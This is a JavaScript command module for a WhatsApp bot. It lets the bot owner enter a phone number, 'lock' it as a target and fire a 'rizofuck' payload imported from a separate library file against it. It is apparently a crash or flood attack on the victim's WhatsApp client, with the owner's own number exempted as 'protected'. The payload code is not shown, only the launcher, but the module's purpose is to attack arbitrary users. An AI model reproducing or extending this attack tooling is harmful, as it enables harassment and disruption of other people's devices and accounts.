const { rizofuck } = require('../lib/rizofuck');

module.exports = {
  name: "rizofuck",
  commands: ['rizofuck', 'rzfuck', 'fuck'],
  category: "owner",
  description: "Execute high-speed interaction loop",
  async execute(sock, m, args) {
    if (!args[0]) {
      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .rizofuck 923xx` }, { quoted: m });
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");
    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
    }

    let target = pepec + '@s.whatsapp.net';
    await sock.sendMessage(m.chat, { text: `💀 *Rizofuck Target Locked:* ${pepec}\n⚡ *Executing sequence...*` }, { quoted: m });

    try {
      await rizofuck(sock, target);
      await sock.sendMessage(m.chat, { react: { text: "💀", key: m.key } });
    } catch (error) {
      await sock.sendMessage(m.chat, { text: "⚠️ Error: Payload execute karte waqt masla aaya hai." }, { quoted: m });
    }
  }
};
